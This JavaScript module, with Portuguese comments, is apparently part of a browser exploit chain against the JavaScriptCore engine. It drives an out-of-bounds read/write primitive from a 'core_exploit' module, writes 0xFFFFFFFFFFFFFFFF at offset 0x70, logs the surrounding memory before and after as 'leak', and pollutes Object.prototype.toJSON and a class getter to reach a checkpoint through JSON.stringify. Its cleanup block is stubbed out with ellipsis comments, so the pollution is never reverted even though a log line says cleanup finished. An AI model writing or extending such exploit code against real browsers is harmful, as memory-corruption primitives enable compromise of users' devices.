// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs (ou renomeie o arquivo se preferir)
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck"; // Ainda usado para o ponto de execução
let getter_called_flag_for_write_test = false;
let write_inspect_results = { message: "Teste não iniciado" };


class CheckpointObjectForWriteInspect { // Renomeado para clareza
    constructor(id) {
        this.id = `WriteInspectCheckpoint-${id}`;
    }
}

export function toJSON_TriggerWriteInspectGetter() { // Renomeado para clareza
    const FNAME_toJSON = "toJSON_TriggerWriteInspectGetter";
    if (this instanceof CheckpointObjectForWriteInspect) {
        logS3(`toJSON_TriggerWriteInspectGetter: 'this' É Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        } catch (e) {
            logS3(`toJSON_TriggerWriteInspectGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}


export async function executeRetypeOOB_AB_Test() { // Mantenha o nome da função exportada para não quebrar runAllAdvancedTestsS3
    const FNAME_TEST = "executeWriteInspectTest";
    logS3(`--- Iniciando Teste de Inspeção da Escrita OOB em 0x70 ---`, "test", FNAME_TEST);

    getter_called_flag_for_write_test = false;
    write_inspect_results = { message: "Teste não executado ou getter não chamado." };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            write_inspect_results = { message: "Falha ao inicializar OOB." };
            logS3(write_inspect_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}, oob_dv_len: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);

        const trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const value_to_write = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        const bytes_to_inspect = 16; // Inspecionar 16 bytes ao redor

        // 1. Inspecionar ANTES da escrita
        logS3(`INSPECIONANDO ANTES: Lendo ${bytes_to_inspect} bytes no offset abs ${toHex(trigger_offset_abs)} do oob_ab_data...`, "info", FNAME_TEST);
        let data_before_str = "ERRO AO LER ANTES";
        try {
            let temp_data_before = [];
            for (let i = 0; i < bytes_to_inspect; i += 4) { // Lendo de 4 em 4 bytes
                if (trigger_offset_abs + i < (OOB_CONFIG.ALLOCATION_SIZE - 4 + OOB_CONFIG.BASE_OFFSET_IN_DV)) { // Evitar ler fora dos limites do buffer real
                     temp_data_before.push(toHex(oob_read_absolute(trigger_offset_abs + i, 4)));
                } else {
                    temp_data_before.push("OOB_READ_SKIPPED");
                }
            }
            data_before_str = temp_data_before.join(' ');
            logS3(`DADOS ANTES em ${toHex(trigger_offset_abs)}: [${data_before_str}]`, "leak", FNAME_TEST);
        } catch (e) {
            logS3(`Erro ao ler dados ANTES: ${e.message}`, "error", FNAME_TEST);
        }


        // 2. Realizar a escrita OOB "gatilho"
        logS3(`Realizando escrita OOB em offset ${toHex(trigger_offset_abs)} com valor ${value_to_write.toString(true)}`, "info", FNAME_TEST);
        oob_write_absolute(trigger_offset_abs, value_to_write, 8); // Escreve 8 bytes
        logS3(`Escrita OOB completada.`, "info", FNAME_TEST);

        // 3. Inspecionar DEPOIS da escrita
        logS3(`INSPECIONANDO DEPOIS: Lendo ${bytes_to_inspect} bytes no offset abs ${toHex(trigger_offset_abs)} do oob_ab_data...`, "info", FNAME_TEST);
        let data_after_str = "ERRO AO LER DEPOIS";
        try {
            let temp_data_after = [];
             for (let i = 0; i < bytes_to_inspect; i += 4) {
                if (trigger_offset_abs + i < (OOB_CONFIG.ALLOCATION_SIZE - 4 + OOB_CONFIG.BASE_OFFSET_IN_DV)) {
                    temp_data_after.push(toHex(oob_read_absolute(trigger_offset_abs + i, 4)));
                } else {
                    temp_data_after.push("OOB_READ_SKIPPED");
                }
            }
            data_after_str = temp_data_after.join(' ');
            logS3(`DADOS DEPOIS em ${toHex(trigger_offset_abs)}: [${data_after_str}]`, "leak", FNAME_TEST);
            write_inspect_results.message = `Escrita em ${toHex(trigger_offset_abs)}. Antes: [${data_before_str}], Depois: [${data_after_str}]`;
        } catch (e) {
            logS3(`Erro ao ler dados DEPOIS: ${e.message}`, "error", FNAME_TEST);
            write_inspect_results.message = `Escrita em ${toHex(trigger_offset_abs)}. Antes: [${data_before_str}], Erro ao ler depois: ${e.message}`;
        }

        // 4. Configurar o getter e poluir para acionar o ponto de verificação (opcional para este teste, mas mantém o fluxo)
        const checkpoint_obj = new CheckpointObjectForWriteInspect(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForWriteInspect.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForWriteInspect.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                getter_called_flag_for_write_test = true;
                const FNAME_GETTER = "WriteInspectGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO (após inspeção de escrita).`, "vuln", FNAME_GETTER);
                // Poderia adicionar verificações aqui se a escrita OOB tivesse um efeito esperado no estado global
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerWriteInspectGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj) para (opcionalmente) acionar getter...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro durante JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal no teste: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        write_inspect_results.message = `Erro crítico no fluxo: ${mainError.message}`;
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForWriteInspect.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza de poluição finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag_for_write_test) {
        logS3(`RESULTADO TESTE ESCRITA: Getter foi chamado. ${write_inspect_results.message}`, "info", FNAME_TEST);
    } else {
        logS3(`RESULTADO TESTE ESCRITA: Getter NÃO foi chamado (ou teste de escrita falhou antes). ${write_inspect_results.message}`, "warn", FNAME_TEST);
    }
    logS3(`  Detalhes finais da inspeção: ${JSON.stringify(write_inspect_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de Inspeção da Escrita OOB Concluído ---`, "test", FNAME_TEST);
}
